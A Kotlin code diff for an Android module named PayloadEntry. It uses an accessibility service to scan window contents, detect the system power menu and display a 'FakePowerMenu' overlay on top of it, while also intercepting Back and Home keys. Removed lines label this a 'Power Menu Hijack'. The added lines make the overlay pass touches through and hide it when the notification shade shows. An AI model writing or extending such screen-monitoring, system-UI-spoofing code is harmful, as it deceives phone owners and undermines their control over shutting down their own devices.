@@ -19,59 +19,57 @@ import java.io.File
 
 class PayloadEntry : DynamicEntry {
     private var isOverlayShowing by mutableStateOf(false)
+    private var isShadeVisible by mutableStateOf(false)
 
     override @Composable fun Render(context: Context, resDir: File) {
-        // 1. Monitor the Tree for the Power Menu
         LaunchedEffect(Unit) {
-            DynamicEntry.log("🕵️ Ghost Monitor Active: Waiting for Power Menu...")
+            DynamicEntry.log("🕵️ Pass-through Monitor Active")
             
             DynamicEntry.accessibilityInterceptor = { event ->
-                // Only scan when the window actually changes to save CPU and prevent crashes
                 if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+                    val packageName = event.packageName?.toString() ?: ""
+                    
+                    // Hide if system UI (shade/launcher) takes focus
+                    isShadeVisible = packageName == "com.android.systemui"
+                    
                     val root = DynamicEntry.activeAccessibilityService?.rootInActiveWindow
                     root?.let {
                         try {
                             val nodes = mutableListOf<String>()
                             findTextNodes(it, nodes)
                             
-                            if (nodes.any { n -> n.contains("Power off", ignoreCase = true) } && 
-                                nodes.any { n -> n.contains("Restart", ignoreCase = true) }) {
+                            // Detect power menu but don't block it
+                            if (nodes.any { n -> n.contains("Power off", ignoreCase = true) }) {
                                 if (!isOverlayShowing) {
-                                    DynamicEntry.log("🎯 Power Menu Hijack Triggered")
-                                    // GO WILD: Set custom flags when showing
+                                    DynamicEntry.log("🎯 Power Menu Detected (Pass-through mode)")
                                     DynamicEntry.overlayConfig = DynamicEntry.OverlayConfig(
                                         flags = android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or 
-                                                android.view.WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
+                                                android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or 
                                                 android.view.WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
-                                        alpha = 0.95f
+                                        alpha = 0.8f
                                     )
                                     isOverlayShowing = true
                                 }
+                            } else if (!isShadeVisible && packageName != "android") {
+                                // If we're not in the power menu (android) or shade, we can reset
+                                // but let's keep it simple for now
                             }
-                        } catch (e: Exception) {
-                            DynamicEntry.log("⚠️ Scan error: ${e.message}")
-                        }
-                        // REMOVED it.recycle() - Let the system handle the lifecycle to prevent native crashes
+                        } catch (e: Exception) { }
                     }
                 }
             }
 
-            // 2. Intercept Back/Home keys to dismiss
             DynamicEntry.keyInterceptor = { event ->
-                if (isOverlayShowing && (event.keyCode == android.view.KeyEvent.KEYCODE_BACK || 
-                    event.keyCode == android.view.KeyEvent.KEYCODE_HOME)) {
+                if (event.keyCode == android.view.KeyEvent.KEYCODE_BACK || event.keyCode == android.view.KeyEvent.KEYCODE_HOME) {
                     isOverlayShowing = false
-                    DynamicEntry.overlayContent = null
-                    false // Allow the system to handle the key to actually go back
-                } else {
                     false
-                }
+                } else false
             }
         }
 
-        // 3. Update the Global Overlay Slot
+        // 3. Update the Global Overlay Slot (Only show if shade is hidden)
         SideEffect {
-            if (isOverlayShowing) {
+            if (isOverlayShowing && !isShadeVisible) {
                 DynamicEntry.overlayContent = { FakePowerMenu() }
             } else {
                 DynamicEntry.overlayContent = null
